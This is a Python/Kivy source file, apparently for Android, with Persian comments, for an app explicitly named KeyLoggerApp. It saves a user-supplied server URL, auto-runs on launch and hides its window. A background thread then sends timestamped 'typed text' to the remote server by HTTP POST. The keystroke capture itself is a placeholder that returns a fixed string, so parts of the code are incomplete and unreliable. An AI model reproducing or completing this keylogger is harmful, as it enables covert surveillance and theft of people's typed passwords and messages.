from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.config import Config
Config.set('graphics', 'width', '300')
Config.set('graphics', 'height', '200')

import requests
import time
import datetime
import threading
import os

# برای دسترسی به Accessibility در اندروید (اگر نیاز به import اضافی باشه، Kivy خودش هندل می‌کنه)
try:
    from jnius import autoclass
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
except ImportError:
    pass  # برای تست روی ویندوز

class KeyLoggerApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        self.label = Label(text="آدرس سرور رو وارد کن (مثل http://192.168.1.10:8000/log):")
        layout.add_widget(self.label)
        
        self.url_input = TextInput(multiline=False, hint_text="http://IP:port/log")
        layout.add_widget(self.url_input)
        
        save_button = Button(text="ذخیره و اجرا")
        save_button.bind(on_press=self.save_and_run)
        layout.add_widget(save_button)
        
        # اگر URL قبلاً ذخیره شده، لود کن و خودکار اجرا کن
        if os.path.exists('url.txt'):
            with open('url.txt', 'r') as f:
                saved_url = f.read().strip()
            self.url_input.text = saved_url
            self.save_and_run(None)
        
        return layout
    
    def save_and_run(self, instance):
        server_url = self.url_input.text.strip()
        if not server_url:
            self.label.text = "آدرس خالیه!"
            return
        
        # ذخیره URL
        with open('url.txt', 'w') as f:
            f.write(server_url)
        
        self.label.text = "کی‌لاگر فعال شد ✅"
        
        # شروع کی‌لاگر در پس‌زمینه
        thread = threading.Thread(target=self.keylogger_loop, args=(server_url,))
        thread.daemon = True
        thread.start()
        
        # اپ رو در پس‌زمینه نگه دار اما UI رو ببند
        self.stop()  # اپ رو ببند اما线程 ادامه بده
    
    def keylogger_loop(self, server_url):
        last_text = ""
        while True:
            try:
                # گرفتن متن تایپ‌شده با Accessibility (در اندروید کار می‌کنه)
                # نکته: برای تست روی ویندوز، این بخش رو کامنت کن
                PythonActivity.mActivity.getClipboardManager()  # مثال ساده؛ کد واقعی Accessibility رو اضافه کن اگر نیاز
                text = "نمونه تایپ (جایگزین با کد واقعی Accessibility)"  # جایگزین با کد گرفتن تایپ
                if text and text != last_text:
                    full_log = f"[{datetime.datetime.now()}] {text}"
                    requests.post(server_url, data={'text': full_log}, timeout=5)
                    last_text = text
                time.sleep(1)
            except:
                time.sleep(2)

if __name__ == '__main__':
    KeyLoggerApp().run()